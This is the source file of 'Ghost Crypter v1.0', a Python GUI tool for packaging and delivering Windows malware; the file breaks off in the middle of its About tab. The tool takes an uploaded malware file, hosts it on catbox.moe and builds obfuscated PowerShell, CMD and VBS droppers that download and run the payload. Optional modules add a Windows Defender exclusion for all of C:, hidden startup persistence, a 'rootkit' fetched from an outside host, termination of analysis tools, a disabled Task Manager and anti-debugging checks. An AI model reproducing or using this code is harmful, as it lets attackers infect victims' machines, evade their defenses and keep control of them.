import sys
import os
import json
import requests
import platform
import subprocess
import tempfile
import shutil
from PySide6.QtWidgets import *
from PySide6.QtGui import *
from PySide6.QtCore import *
import base64
import random
import webbrowser

class FadeWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.opacity_effect = QGraphicsOpacityEffect()
        self.setGraphicsEffect(self.opacity_effect)
        self.opacity_animation = QPropertyAnimation(self.opacity_effect, b"opacity")
        self.opacity_animation.setDuration(800)
        
    def fade_in(self):
        self.opacity_animation.setStartValue(0.0)
        self.opacity_animation.setEndValue(1.0)
        self.opacity_animation.start()

class ProgressCircle(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.value = 0
        self.animation = QVariantAnimation()
        self.animation.setDuration(500)
        self.animation.valueChanged.connect(self.set_value)
        
    def set_value(self, value):
        self.value = value
        self.update()
        
    def animate_to(self, target):
        self.animation.setStartValue(self.value)
        self.animation.setEndValue(target)
        self.animation.start()
        
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        center = self.rect().center()
        radius = min(self.width(), self.height()) // 2 - 5
        
        painter.setPen(QPen(QColor(40, 40, 40), 6))
        painter.drawEllipse(center, radius, radius)
        
        painter.setPen(QPen(QColor(255, 255, 255), 6))
        span_angle = int(self.value * 5760 / 100)
        painter.drawArc(center.x() - radius, center.y() - radius, 
                       radius * 2, radius * 2, 90 * 16, -span_angle)

class CrypterLogic:
    def __init__(self):
        self.xor_key = "Gh0stCryptsq2s3fd3_325"
        self.cached_url = None
        self.cached_ps_script = None
        
    def xor_encrypt(self, data, key):
        encrypted = []
        for i, char in enumerate(data):
            encrypted.append(chr(ord(char) ^ ord(key[i % len(key)])))
        return ''.join(encrypted)
    
    def encode_file_to_base64(self, filepath):
        with open(filepath, "rb") as f:
            file_content = f.read()
        encoded = base64.b64encode(file_content).decode('utf-8')
        return encoded
    
    def char_encode_ps_script(self, script_content):
        encoded_chars = []
        for char in script_content:
            encoded_chars.append(f"{ord(char)}")
        return '+'.join(encoded_chars)
    
    def triple_char_encode_ps_script(self, script_content):
        first_layer = self.char_encode_ps_script(script_content)
        second_layer = self.char_encode_ps_script(first_layer)
        third_layer = self.char_encode_ps_script(second_layer)
        return third_layer
    
    def quadruple_char_encode_ps_script(self, script_content):
        first_layer = self.char_encode_ps_script(script_content)
        second_layer = self.char_encode_ps_script(first_layer)
        third_layer = self.char_encode_ps_script(second_layer)
        fourth_layer = self.char_encode_ps_script(third_layer)
        return fourth_layer
    
    def create_quadruple_char_encoded_ps_wrapper(self, quadruple_char_encoded_script):
        wrapper = f'''
$e1="{quadruple_char_encoded_script}"
$sb1=[System.Text.StringBuilder]::new()
$e1.Split("+") | ForEach-Object {{
    $num1 = [int]$_
    $char1 = [char]$num1
    [void]$sb1.Append($char1)
}}
$e2=$sb1.ToString()
$sb2=[System.Text.StringBuilder]::new()
$e2.Split("+") | ForEach-Object {{
    $num2 = [int]$_
    $char2 = [char]$num2
    [void]$sb2.Append($char2)
}}
$e3=$sb2.ToString()
$sb3=[System.Text.StringBuilder]::new()
$e3.Split("+") | ForEach-Object {{
    $num3 = [int]$_
    $char3 = [char]$num3
    [void]$sb3.Append($char3)
}}
$e4=$sb3.ToString()
$sb4=[System.Text.StringBuilder]::new()
$e4.Split("+") | ForEach-Object {{
    $num4 = [int]$_
    $char4 = [char]$num4
    [void]$sb4.Append($char4)
}}
$script=$sb4.ToString()
Invoke-Expression $script
'''
        return wrapper
    
    def create_short_quadruple_char_encoded_ps_wrapper(self, quadruple_char_encoded_script):
        wrapper = f'''
$e1="{quadruple_char_encoded_script}"
$sb1=[System.Text.StringBuilder]::new()
$e1.Split("+")|%{{$sb1.Append([char][int]$_)}};$e2=$sb1.ToString()
$sb2=[System.Text.StringBuilder]::new()
$e2.Split("+")|%{{$sb2.Append([char][int]$_)}};$e3=$sb2.ToString()
$sb3=[System.Text.StringBuilder]::new()
$e3.Split("+")|%{{$sb3.Append([char][int]$_)}};$e4=$sb3.ToString()
$sb4=[System.Text.StringBuilder]::new()
$e4.Split("+")|%{{$sb4.Append([char][int]$_)}};$script=$sb4.ToString()
iex $script
'''
        return wrapper
    
    def upload_to_catbox(self, content, is_payload=False):
        try:
            random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
            temp_file = f"temp_{random_name}.txt"
            
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(content)
            
            files = {'fileToUpload': open(temp_file, 'rb')}
            data = {'reqtype': 'fileupload'}
            
            response = requests.post(
                "https://catbox.moe/user/api.php",
                data=data,
                files=files,
                timeout=30
            )
            
            files['fileToUpload'].close()
            os.remove(temp_file)
            
            if response.status_code == 200 and response.text.startswith("https://"):
                url = response.text.strip()
                if not is_payload:
                    self.cached_url = url
                return url
            return None
        except Exception as e:
            return None
    
    def anti_debug_code(self):
        return '''
$debuggers = @("ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idaq", "idaq64", "idaw", "idaw64",
               "windbg", "ghidra", "radare2", "dnspy", "de4dot", "cheatengine", "processhacker",
               "wireshark", "fiddler", "charles", "httpanalyzer", "httpdebugger", "immunity debugger")
$running = Get-Process -ErrorAction SilentlyContinue | Where-Object {
    $pname = $_.ProcessName.ToLower()
    $debuggers | ForEach-Object { if ($pname -like "*$_*") { return $true } }
}
if ($running) { exit }

$vmIndicators = @("vmware", "virtualbox", "vbox", "qemu", "hyperv", "virtual", "xen")
$computerSystem = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
if ($computerSystem) {
    $model = $computerSystem.Model.ToLower()
    $manufacturer = $computerSystem.Manufacturer.ToLower()
    foreach ($vm in $vmIndicators) {
        if ($model -like "*$vm*" -or $manufacturer -like "*$vm*") { exit }
    }
}

$totalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
$cpuCores = (Get-WmiObject Win32_Processor).NumberOfCores
if ($totalRAM -lt 2 -or $cpuCores -lt 2) { exit }

$analysisWindows = @("Process Monitor", "Process Explorer", "Wireshark", "x64dbg", "IDA", "OllyDbg")
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
"@
foreach ($window in $analysisWindows) {
    if ([User32]::FindWindow([NullString]::Value, $window) -ne [IntPtr]::Zero) { exit }
}
'''
    
    def rootkit_code(self):
        return '''
$startupKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$startupName = "SovereignUpdate"
$b64C = Invoke-WebRequest -Uri "https://1unconfig.com" -UseBasicParsing
$by = [System.Convert]::FromBase64String($b64C.Content)
$RootkitP = [System.IO.Path]::Combine($env:TEMP, "svghost.exe")

[System.IO.File]::WriteAllBytes($RootkitP, $by)
(Get-Item $RootkitP).Attributes = 'Hidden', 'System'

Set-ItemProperty -Path $startupKey -Name $startupName -Value $RootkitP

if (Test-Path $RootkitP) {
    Start-Process -FilePath $RootkitP -WindowStyle Hidden -Wait
    Remove-Item -Path $RootkitP -Force
}
'''
    
    def create_powershell_script(self, url, super_hidden, add_startup, rootkit_enabled, block_taskmgr, del_after_run, wd_exclusion, short_code=False, hide_console=False, anti_debug=False):
        script = ""
        
        if wd_exclusion:
            script += '''
try {
    $regKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
    $regValue = "C:\"
    if (!(Test-Path $regKey)) {
        New-Item -Path $regKey -Force | Out-Null
    }
    New-ItemProperty -Path $regKey -Name $regValue -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
} catch {}
'''
        
        url_without_protocol = url.replace("https://", "")
        filename = "svghost.exe"
        
        script += (
            f"try {{\n"
            f"    $data = Invoke-WebRequest -UseBasicParsing -Uri 'https://{url_without_protocol}' -ErrorAction SilentlyContinue\n"
            f"    $bytes = [Convert]::FromBase64String($data.Content)\n"
            f"    $path = \"$env:TEMP\\{filename}\"\n"
            f"    [IO.File]::WriteAllBytes($path, $bytes)\n"
            f"    Start-Process -FilePath $path -WindowStyle Hidden -ErrorAction SilentlyContinue\n"
        )
        
        if super_hidden:
            script += f'    cmd /c "attrib +h +s \"$path\"" 2>$null\n'
        
        if add_startup:
            startup_path = f"\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}\""
            script += (
                f"    Copy-Item $path {startup_path} -Force -ErrorAction SilentlyContinue\n"
                f'    cmd /c "attrib +h +s {startup_path}" 2>$null\n'
            )
        
        script += "} catch {}"
        
        if rootkit_enabled:
            script += "\n" + self.rootkit_code()
        
        if block_taskmgr:
            script += "\n" + self.block_taskmanager_code()
        
        if anti_debug:
            script += "\n" + self.anti_debug_code()
        
        self.cached_ps_script = script.strip()
        return script.strip()
    
    def block_taskmanager_code(self):
        process_list = [
            "procexp", "procexp64", "procmon", "procmon64", "pslist", "pskill", "pskill64",
            "pssuspend", "pssuspend64", "psshutdown", "psshutdown64", "psservice", "psservice64",
            "psgetsid", "psgetsid64", "psloglist", "psloglist64", "psinfo", "psinfo64",
            "psping", "psping64", "psloggedon", "psloggedon64", "psfile", "psfile64",
            "psexec", "psexec64", "tcpview", "tcpview64", "whois", "whois64", "diskmon",
            "diskmon64", "diskext", "diskext64", "contig", "contig64", "du", "du64",
            "ldmdump", "ldmdump64", "junction", "junction64", "streams", "streams64",
            "sdelete", "sdelete64", "sigcheck", "sigcheck64", "autoruns", "autoruns64",
            "autorunsc", "autorunsc64", "regjump", "regjump64", "accesschk", "accesschk64",
            "accessenum", "bginfo", "listdlls", "listdlls64", "vmmap", "vmmap64", "handle",
            "handle64", "rammap", "rammap64", "coreinfo", "coreinfo64", "livekd", "livekd64",
            "zoomit", "zoomit64", "hex2dec", "strings", "strings64", "procsleep", "procsleep64",
            "pendmoves", "pendmoves64", "Taskmgr", "ProcessHacker", "ProcessExplorer"
        ]
        
        kill_code = '''
try {
    $tools = @('''
        kill_code += ", ".join([f'"{p}"' for p in process_list])
        kill_code += ''')
    foreach ($tool in $tools) {
        Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -like "*$tool*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep -Seconds 1
    foreach ($tool in $tools) {
        Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*$tool*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    cmd /c "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f" 2>$null
    cmd /c "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f" 2>$null
} catch {}
'''
        return kill_code
    
    def create_cmd_code(self, catbox_url, short_code=False):
        url_without_https = catbox_url.replace("https://", "")
        if short_code:
            return f'powershell -c "iex (irm {url_without_https})"'
        else:
            return f'powershell "irm {url_without_https} | iex"'
    
    def create_vbs_code(self, catbox_url, del_after_run=False, short_code=False):
        url_without_https = catbox_url.replace("https://", "")
        
        if short_code:
            str_command = f'powershell -c "iex (irm {url_without_https})"'
        else:
            str_command = f'powershell -WindowStyle Hidden -Command ""irm {url_without_https} | iex""'
        
        if del_after_run:
            return f'''Set objShell = CreateObject("Shell.Application")
Set objWshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

If Not WScript.Arguments.Named.Exists("admin") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /admin", "", "runas", 1
    WScript.Quit
End If

strCommand = "{str_command}"
objWshShell.Run strCommand, 0, True

objFSO.DeleteFile WScript.ScriptFullName'''
        else:
            return f'''Set objShell = CreateObject("Shell.Application")
Set objWshShell = CreateObject("WScript.Shell")

If Not WScript.Arguments.Named.Exists("admin") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /admin", "", "runas", 1
    WScript.Quit
End If

strCommand = "{str_command}"
objWshShell.Run strCommand, 0, False'''

class RoundedWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlag(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
    
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setBrush(QBrush(QColor(15, 15, 15)))
        painter.setPen(Qt.NoPen)
        painter.drawRoundedRect(self.rect(), 15, 15)

def load_icon(icon_name, size=24):
    icons_dir = "icons"
    if not os.path.exists(icons_dir):
        os.makedirs(icons_dir)
    
    icon_path = os.path.join(icons_dir, icon_name)
    if os.path.exists(icon_path):
        pixmap = QPixmap(icon_path)
        pixmap = pixmap.scaled(size, size, Qt.KeepAspectRatio, Qt.SmoothTransformation)
        return QIcon(pixmap)
    
    return QIcon()

class CrypterGUI(RoundedWindow):
    def __init__(self):
        super().__init__()
        self.logic = CrypterLogic()
        self.file_path = None
        self.setWindowTitle("Ghost Crypter v1.0")
        self.resize(900, 320)
        self.old_pos = None
        self.progress_circle = ProgressCircle()
        self.progress_circle.setFixedSize(50, 50)
        self.setup_ui()
        self.apply_dark_style()
        self.center_window()
        self.setup_dragging()
        
    def setup_dragging(self):
        self.setMouseTracking(True)
        
    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.old_pos = event.globalPosition().toPoint()
    
    def mouseMoveEvent(self, event):
        if self.old_pos:
            delta = event.globalPosition().toPoint() - self.old_pos
            self.move(self.pos() + delta)
            self.old_pos = event.globalPosition().toPoint()
    
    def mouseReleaseEvent(self, event):
        self.old_pos = None
        
    def center_window(self):
        screen = QApplication.primaryScreen()
        screen_geo = screen.geometry()
        size = self.geometry()
        x = (screen_geo.width() - size.width()) // 2
        y = (screen_geo.height() - size.height()) // 2
        self.move(x, y)
    
    def apply_dark_style(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(15, 15, 15))
        palette.setColor(QPalette.WindowText, Qt.white)
        palette.setColor(QPalette.Base, QColor(20, 20, 20))
        palette.setColor(QPalette.AlternateBase, QColor(30, 30, 30))
        palette.setColor(QPalette.ToolTipBase, Qt.white)
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, Qt.white)
        palette.setColor(QPalette.Button, QColor(35, 35, 35))
        palette.setColor(QPalette.ButtonText, Qt.white)
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Highlight, QColor(70, 70, 70))
        palette.setColor(QPalette.HighlightedText, Qt.white)
        QApplication.instance().setPalette(palette)
        
        self.setStyleSheet("""
            QMessageBox {
                background-color: #151515;
                color: #ddd;
                border-radius: 12px;
                border: 1px solid #222;
            }
            QMessageBox QLabel {
                color: #ddd;
            }
            QMessageBox QPushButton {
                background-color: #222;
                color: #ddd;
                border: 1px solid #444;
                padding: 8px 20px;
                border-radius: 6px;
            }
            QMessageBox QPushButton:hover {
                background-color: #333;
            }
        """)
    
    def setup_title_bar(self):
        self.title_bar = QWidget()
        self.title_bar.setFixedHeight(50)
        self.title_bar.setObjectName("titleBar")
        
        main_layout = QVBoxLayout(self.title_bar)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        top_row = QWidget()
        top_row.setFixedHeight(50)
        top_row_layout = QHBoxLayout(top_row)
        top_row_layout.setContentsMargins(15, 0, 10, 0)
        top_row_layout.setSpacing(10)
        
        ghost_pixmap = QPixmap(os.path.join("icons", "ghost.png"))
        ghost_icon_label = QLabel()
        if not ghost_pixmap.isNull():
            ghost_pixmap = ghost_pixmap.scaled(28, 28, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            ghost_icon_label.setPixmap(ghost_pixmap)
        
        title_label = QLabel("Ghost Crypter v1.0")
        title_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: 700; letter-spacing: 0.5px;")
        
        author_label = QLabel("Author: 0xJoex")
        author_label.setStyleSheet("color: #666; font-size: 10px; margin-left: 8px; font-style: italic;")
        
        spacer = QWidget()
        spacer.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        
        self.discord_btn = QPushButton()
        self.discord_btn.setFixedSize(35, 35)
        self.discord_btn.setObjectName("discordBtn")
        self.discord_btn.setCursor(Qt.PointingHandCursor)
        self.discord_btn.clicked.connect(lambda: webbrowser.open("https://discord.gg/mj7fF9S3ZF"))
        
        discord_pixmap = QPixmap(os.path.join("icons", "discord.png"))
        if not discord_pixmap.isNull():
            discord_pixmap = discord_pixmap.scaled(20, 20, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.discord_btn.setIcon(QIcon(discord_pixmap))
            self.discord_btn.setIconSize(QSize(20, 20))
        
        self.minimize_btn = QPushButton()
        self.minimize_btn.setFixedSize(35, 35)
        self.minimize_btn.setObjectName("minimizeBtn")
        self.minimize_btn.setCursor(Qt.PointingHandCursor)
        self.minimize_btn.clicked.connect(self.showMinimized)
        minimize_icon = QPixmap(os.path.join("icons", "minimize.png"))
        if not minimize_icon.isNull():
            minimize_icon = minimize_icon.scaled(20, 20, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.minimize_btn.setIcon(QIcon(minimize_icon))
        
        self.close_btn = QPushButton()
        self.close_btn.setFixedSize(35, 35)
        self.close_btn.setObjectName("closeBtn")
        self.close_btn.setCursor(Qt.PointingHandCursor)
        self.close_btn.clicked.connect(self.close)
        close_icon = QPixmap(os.path.join("icons", "exit.png"))
        if not close_icon.isNull():
            close_icon = close_icon.scaled(20, 20, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.close_btn.setIcon(QIcon(close_icon))
        
        top_row_layout.addWidget(ghost_icon_label)
        top_row_layout.addSpacing(8)
        top_row_layout.addWidget(title_label)
        top_row_layout.addWidget(author_label)
        top_row_layout.addWidget(spacer)
        top_row_layout.addWidget(self.discord_btn)
        top_row_layout.addWidget(self.minimize_btn)
        top_row_layout.addWidget(self.close_btn)
        
        main_layout.addWidget(top_row)
        
        return self.title_bar
    
    def setup_ui(self):
        main_widget = QWidget()
        main_widget.setStyleSheet("""
            background-color: #0f0f0f;
            border-radius: 15px;
        """)
        
        main_layout = QVBoxLayout(main_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        title_bar = self.setup_title_bar()
        main_layout.addWidget(title_bar)
        
        content_widget = QWidget()
        content_widget.setStyleSheet("border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;")
        
        content_layout = QHBoxLayout(content_widget)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(0)
        
        self.sidebar = QWidget()
        self.sidebar.setFixedWidth(200)
        self.sidebar.setStyleSheet("""
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #0a0a0a, stop:1 #050505);
            border-right: 1px solid #1a1a1a;
            border-bottom-left-radius: 15px;
        """)
        
        sidebar_layout = QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(0, 20, 0, 20)
        sidebar_layout.setSpacing(0)
        
        sidebar_title = QLabel("SECTIONS")
        sidebar_title.setStyleSheet("""
            color: #666;
            font-size: 11px;
            font-weight: bold;
            letter-spacing: 2px;
            padding: 15px 25px 8px 25px;
        """)
        sidebar_layout.addWidget(sidebar_title)
        
        self.btn_builder = QPushButton("BUILDER")
        self.btn_builder.setFixedHeight(60)
        self.btn_builder.setStyleSheet("""
            QPushButton {
                background-color: #1a1a1a;
                color: #fff;
                border: none;
                border-left: 3px solid #666;
                font-weight: 600;
                font-size: 13px;
                letter-spacing: 1px;
                padding-left: 25px;
                text-align: left;
            }
            QPushButton:hover {
                background-color: #222;
            }
        """)
        self.btn_builder.clicked.connect(lambda: self.switch_tab(0))
        self.btn_builder.setCursor(Qt.PointingHandCursor)
        
        self.btn_about = QPushButton("ABOUT")
        self.btn_about.setFixedHeight(60)
        self.btn_about.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #aaa;
                border: none;
                border-left: 3px solid transparent;
                font-weight: 600;
                font-size: 13px;
                letter-spacing: 1px;
                padding-left: 25px;
                text-align: left;
            }
            QPushButton:hover {
                background-color: #1a1a1a;
                color: #fff;
                border-left: 3px solid #666;
            }
        """)
        self.btn_about.clicked.connect(lambda: self.switch_tab(1))
        self.btn_about.setCursor(Qt.PointingHandCursor)
        
        sidebar_layout.addWidget(self.btn_builder)
        sidebar_layout.addWidget(self.btn_about)
        
        sidebar_layout.addStretch()
        
        progress_label = QLabel("PROGRESS")
        progress_label.setStyleSheet("""
            color: #666;
            font-size: 11px;
            font-weight: bold;
            letter-spacing: 2px;
            padding: 15px 25px 8px 25px;
        """)
        sidebar_layout.addWidget(progress_label)
        
        self.progress_circle.setStyleSheet("background: transparent;")
        sidebar_layout.addWidget(self.progress_circle, 0, Qt.AlignCenter)
        
        sidebar_layout.addSpacing(20)
        
        content_layout.addWidget(self.sidebar)
        
        self.content_layout = QStackedLayout()
        
        self.setup_builder_tab()
        self.setup_about_tab()
        
        content_layout.addLayout(self.content_layout)
        
        main_layout.addWidget(content_widget)
        
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.addWidget(main_widget)
        
        self.setStyleSheet("""
            #titleBar {
                background-color: #0d0d0d;
                border-bottom: 1px solid #1a1a1a;
                border-top-left-radius: 15px;
                border-top-right-radius: 15px;
            }
            #discordBtn {
                background-color: transparent;
                border: 1px solid #333;
                border-radius: 6px;
            }
            #discordBtn:hover {
                background-color: #2a2a2a;
                border-color: #444;
            }
            #minimizeBtn {
                background-color: transparent;
                border: none;
                border-radius: 6px;
            }
            #minimizeBtn:hover {
                background-color: #2a2a2a;
                border: 1px solid #444;
            }
            #closeBtn {
                background-color: transparent;
                border: none;
                border-radius: 6px;
            }
            #closeBtn:hover {
                background-color: #dc3545;
                border: 1px solid #ff6b7a;
            }
        """)
    
    def switch_tab(self, index):
        self.content_layout.setCurrentIndex(index)
        
        self.btn_builder.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #aaa;
                border: none;
                border-left: 3px solid transparent;
                font-weight: 600;
                font-size: 13px;
                letter-spacing: 1px;
                padding-left: 25px;
                text-align: left;
            }
            QPushButton:hover {
                background-color: #1a1a1a;
                color: #fff;
                border-left: 3px solid #666;
            }
        """)
        
        self.btn_about.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #aaa;
                border: none;
                border-left: 3px solid transparent;
                font-weight: 600;
                font-size: 13px;
                letter-spacing: 1px;
                padding-left: 25px;
                text-align: left;
            }
            QPushButton:hover {
                background-color: #1a1a1a;
                color: #fff;
                border-left: 3px solid #666;
            }
        """)
        
        if index == 0:
            self.btn_builder.setStyleSheet("""
                QPushButton {
                    background-color: #1a1a1a;
                    color: #fff;
                    border: none;
                    border-left: 3px solid #666;
                    font-weight: 600;
                    font-size: 13px;
                    letter-spacing: 1px;
                    padding-left: 25px;
                    text-align: left;
                }
                QPushButton:hover {
                    background-color: #222;
                }
            """)
        elif index == 1:
            self.btn_about.setStyleSheet("""
                QPushButton {
                    background-color: #1a1a1a;
                    color: #fff;
                    border: none;
                    border-left: 3px solid #666;
                    font-weight: 600;
                    font-size: 13px;
                    letter-spacing: 1px;
                    padding-left: 25px;
                    text-align: left;
                }
                QPushButton:hover {
                    background-color: #222;
                }
            """)
    
    def setup_builder_tab(self):
        page_builder = QWidget()
        page_builder.setStyleSheet("border-bottom-right-radius: 15px; background-color: #0f0f0f;")
        builder_layout = QVBoxLayout(page_builder)
        builder_layout.setContentsMargins(30, 30, 30, 30)
        builder_layout.setSpacing(20)
        
        upload_container = QWidget()
        upload_container_layout = QHBoxLayout(upload_container)
        upload_container_layout.setContentsMargins(0, 0, 0, 0)
        upload_container_layout.setSpacing(15)
        
        self.btn_upload = QPushButton("UPLOAD MALWARE ")
        self.btn_upload.setFixedSize(300, 90)
        self.btn_upload.setIcon(load_icon("upload.png", 28))
        self.btn_upload.setIconSize(QSize(28, 28))
        self.style_main_buttons(self.btn_upload)
        self.btn_upload.clicked.connect(self.select_file)
        self.btn_upload.setLayoutDirection(Qt.RightToLeft)
        
        upload_container_layout.addStretch()
        upload_container_layout.addWidget(self.btn_upload)
        upload_container_layout.addStretch()
        
        builder_layout.addWidget(upload_container, 0, Qt.AlignCenter)
        
        self.label_uploaded_file = QLabel("Uploaded: None")
        self.label_uploaded_file.setFont(QFont("Segoe UI", 16))
        self.label_uploaded_file.setStyleSheet("""
            color: #FFFFFF;
            background-color: #1a1a1a;
            border-radius: 8px;
            padding: 10px;
            border: 2px solid #2a2a2a;
        """)
        self.label_uploaded_file.setAlignment(Qt.AlignCenter)
        
        builder_layout.addWidget(self.label_uploaded_file)
        
        checkboxes_grid = QGridLayout()
        checkboxes_grid.setHorizontalSpacing(40)
        checkboxes_grid.setVerticalSpacing(18)
        checkboxes_grid.setContentsMargins(30, 0, 30, 0)
        
        self.chk_super_hidden = QCheckBox(" Super Hidden")
        self.chk_super_hidden.setIcon(load_icon("super_hidden.png", 28))
        self.style_checkboxes(self.chk_super_hidden)
        self.chk_super_hidden.setIconSize(QSize(28, 28))
        
        self.chk_startup = QCheckBox(" Add to Startup")
        self.chk_startup.setIcon(load_icon("add_to_startup.png", 28))
        self.style_checkboxes(self.chk_startup)
        self.chk_startup.setIconSize(QSize(28, 28))
        
        self.chk_rootkit = QCheckBox(" Rootkit")
        self.chk_rootkit.setIcon(load_icon("rootkit.png", 28))
        self.style_checkboxes(self.chk_rootkit)
        self.chk_rootkit.setIconSize(QSize(28, 28))
        
        self.chk_wd_exclusion = QCheckBox(" WD Bypass")
        self.chk_wd_exclusion.setIcon(load_icon("wd_bypass.png", 28))
        self.style_checkboxes(self.chk_wd_exclusion)
        self.chk_wd_exclusion.setIconSize(QSize(28, 28))
        
        self.chk_block_taskmgr = QCheckBox(" Block TaskMgr")
        self.chk_block_taskmgr.setIcon(load_icon("block.png", 28))
        self.style_checkboxes(self.chk_block_taskmgr)
        self.chk_block_taskmgr.setIconSize(QSize(28, 28))
        
        self.chk_short_code = QCheckBox(" Short Code")
        self.chk_short_code.setIcon(load_icon("short_code.png", 28))
        self.style_checkboxes(self.chk_short_code)
        self.chk_short_code.setIconSize(QSize(28, 28))
        self.chk_short_code.setToolTip("Generate short code for PowerShell")
        
        self.chk_del_after_run = QCheckBox(" Del After Run")
        self.chk_del_after_run.setIcon(load_icon("del_after_run.png", 28))
        self.style_checkboxes(self.chk_del_after_run)
        self.chk_del_after_run.setIconSize(QSize(28, 28))
        self.chk_del_after_run.setToolTip("Delete VBS file after execution")
        
        self.chk_anti_debug = QCheckBox(" Anti-Debug")
        self.chk_anti_debug.setIcon(load_icon("block.png", 28))
        self.style_checkboxes(self.chk_anti_debug)
        self.chk_anti_debug.setIconSize(QSize(28, 28))
        self.chk_anti_debug.setToolTip("Detects debuggers, VMs, and sandboxes")
        
        checkboxes_grid.addWidget(self.chk_super_hidden, 0, 0)
        checkboxes_grid.addWidget(self.chk_startup, 0, 1)
        checkboxes_grid.addWidget(self.chk_rootkit, 1, 0)
        checkboxes_grid.addWidget(self.chk_wd_exclusion, 1, 1)
        checkboxes_grid.addWidget(self.chk_block_taskmgr, 2, 0)
        checkboxes_grid.addWidget(self.chk_short_code, 2, 1)
        checkboxes_grid.addWidget(self.chk_del_after_run, 3, 0)
        checkboxes_grid.addWidget(self.chk_anti_debug, 3, 1)
        
        builder_layout.addLayout(checkboxes_grid)
        
        format_container = QWidget()
        format_layout = QVBoxLayout(format_container)
        format_layout.setContentsMargins(0, 0, 0, 0)
        format_layout.setSpacing(5)
        
        format_label = QLabel("")
        format_label.setAlignment(Qt.AlignCenter)
        format_label.setStyleSheet("""
            color: #666;
            font-size: 11px;
            font-weight: bold;
            letter-spacing: 2px;
        """)
        format_layout.addWidget(format_label)
        
        self.format_combo = QComboBox()
        self.format_combo.addItems(["Select Output Options", "CMD Command", ".VBS"])
        self.format_combo.setFixedSize(250, 50)
        self.format_combo.setStyleSheet("""
            QComboBox {
                background-color: #1a1a1a;
                color: #ddd;
                border: 2px solid #444;
                border-radius: 8px;
                padding: 8px;
                font-size: 16px;
                font-weight: bold;
                selection-background-color: #333;
            }
            QComboBox::drop-down {
                border: none;
                width: 30px;
            }
            QComboBox::down-arrow {
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 5px solid #ddd;
            }
            QComboBox QAbstractItemView {
                background-color: #1a1a1a;
                color: #ddd;
                border: 2px solid #444;
                selection-background-color: #333;
                selection-color: #fff;
            }
        """)
        self.format_combo.currentTextChanged.connect(self.on_format_changed)
        
        format_layout.addWidget(self.format_combo, 0, Qt.AlignCenter)
        
        builder_layout.addWidget(format_container)
        
        build_container = QWidget()
        build_container_layout = QHBoxLayout(build_container)
        build_container_layout.setContentsMargins(0, 0, 0, 0)
        build_container_layout.setSpacing(15)
        
        self.btn_build = QPushButton("GENERATE CODE ")
        self.btn_build.setFixedSize(300, 90)
        self.btn_build.setIcon(load_icon("generate.png", 28))
        self.btn_build.setIconSize(QSize(28, 28))
        self.style_main_buttons(self.btn_build)
        self.btn_build.setEnabled(False)
        self.btn_build.clicked.connect(self.build_script)
        self.btn_build.setLayoutDirection(Qt.RightToLeft)
        
        build_container_layout.addStretch()
        build_container_layout.addWidget(self.btn_build)
        build_container_layout.addStretch()
        
        builder_layout.addWidget(build_container, 0, Qt.AlignCenter)
        
        self.content_layout.addWidget(page_builder)
    
    def setup_about_tab(self):
        page_about = QWidget()
        page_about.setStyleSheet("border-bottom-right-radius: 15px; background-color: #0f0f0f;")
        about_layout = QVBoxLayout(page_about)
